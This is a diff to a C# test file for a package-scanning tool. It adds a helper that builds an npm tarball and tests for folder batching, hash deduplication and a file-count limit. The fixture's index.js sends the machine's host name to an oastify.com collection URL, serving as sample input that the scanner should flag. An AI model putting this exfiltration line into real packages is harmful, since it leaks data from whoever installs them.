@@ -292,12 +292,11 @@ public class FileBatchTests
         Assert.Contains(strings["result"]!["items"]!.AsArray(), i => (string?)i!["value"] == AssetFileStringsTests.Url);
     }
 
-    [Fact]
-    public async Task The_summary_names_the_file_level_and_the_findings_that_set_it()
+    /// <summary>Writes an npm package whose install script sends the host name to a collection URL.</summary>
+    internal static string Package(string path)
     {
-        using var dir = new TempDir();
-        var package = Path.Combine(dir.Path, "internal-auth-1.0.0.tgz");
-        using (var gz = new GZipStream(File.Create(package), CompressionLevel.Fastest))
+        Directory.CreateDirectory(Path.GetDirectoryName(path)!);
+        using (var gz = new GZipStream(File.Create(path), CompressionLevel.Fastest))
         using (var tar = new System.Formats.Tar.TarWriter(gz, System.Formats.Tar.TarEntryFormat.Ustar))
             foreach (var (name, text) in new[]
                      {
@@ -305,6 +304,14 @@ public class FileBatchTests
                          ("package/index.js", "const os=require('os'),https=require('https');\nhttps.get('https://x1.oastify.com/?h='+os.hostname());"),
                      })
                 tar.WriteEntry(new System.Formats.Tar.UstarTarEntry(System.Formats.Tar.TarEntryType.RegularFile, name) { DataStream = new MemoryStream(System.Text.Encoding.UTF8.GetBytes(text)) });
+        return path;
+    }
+
+    [Fact]
+    public async Task The_summary_names_the_file_level_and_the_findings_that_set_it()
+    {
+        using var dir = new TempDir();
+        var package = Package(Path.Combine(dir.Path, "internal-auth-1.0.0.tgz"));
         var (_, document, _) = await Batch("--file", package);
         var summary = document!["summary"]!;
         Assert.Equal("noteworthy", (string?)summary["level"]);
@@ -329,6 +336,44 @@ public class FileBatchTests
         Assert.Equal(Corvus.Services.Analysis.FindingRules.Digest, (string?)document!["ruleTable"]);
         var installed = Corvus.Core.RulePacks.Installed(Corvus.Core.RulePacks.Root).Select(p => $"{p.Name} {p.Version} {p.Digest ?? "unknown"}");
         Assert.Equal(installed, document["rulePacks"]!.AsArray().Select(p => $"{(string?)p!["name"]} {(string?)p["version"]} {(string?)p["digest"]}"));
+    }
+
+    [Fact]
+    public async Task A_folder_gives_one_record_per_sha256_with_every_path_and_the_noteworthy_record_first()
+    {
+        using var dir = new TempDir();
+        File.WriteAllText(Path.Combine(dir.Path, "a.txt"), "plain text");
+        var package = Package(Path.Combine(dir.Path, "sub", "pkg.tgz"));
+        Directory.CreateDirectory(Path.Combine(dir.Path, "sub", "deep"));
+        File.Copy(package, Path.Combine(dir.Path, "sub", "deep", "pkg-copy.tgz"));
+        var (code, document, _) = await Batch("--file", dir.Path, "--recurse");
+        Assert.Equal(0, code);
+        Assert.Equal("noteworthy", (string?)document!["summary"]!["level"]);
+        Assert.Equal(3, (int)document["summary"]!["files"]!);
+        var records = document["records"]!.AsArray();
+        Assert.Equal(2, records.Count);
+        var first = records[0]!;
+        Assert.Equal(["sub/deep/pkg-copy.tgz", "sub/pkg.tgz"], first["file"]!["paths"]!.AsArray().Select(p => (string?)p));
+        Assert.Equal("noteworthy", (string?)first["summary"]!["level"]);
+        Assert.True((int)first["counts"]!["noteworthy"]! > 0);
+        var sha = (string)first["file"]!["sha256"]!;
+        Assert.Equal(Convert.ToHexStringLower(System.Security.Cryptography.SHA256.HashData(File.ReadAllBytes(package))), sha);
+        Assert.All(first["findings"]!.AsArray(), f => Assert.StartsWith(sha + "|" + (string?)f!["rule"] + "|", (string?)f["key"]));
+        Assert.Equal("a.txt", (string?)records[1]!["file"]!["paths"]![0]);
+        Assert.Equal("none", (string?)records[1]!["summary"]!["level"]);
+        Assert.Null(document["sections"]);
+    }
+
+    [Fact]
+    public async Task Files_past_the_members_limit_are_named_and_leave_the_run_incomplete()
+    {
+        using var dir = new TempDir();
+        for (int i = 0; i < 3; i++) File.WriteAllText(Path.Combine(dir.Path, $"f{i}.txt"), $"text {i}");
+        var (code, document, _) = await Batch("--file", dir.Path, "--recurse", "--limit", "members=2");
+        Assert.Equal(0, code);
+        Assert.Equal(2, document!["records"]!.AsArray().Count);
+        Assert.False((bool)document["complete"]!);
+        Assert.StartsWith("Files past the members limit of 2: 1, from ", (string?)document["unread"]![0]);
     }
 
     [Fact]
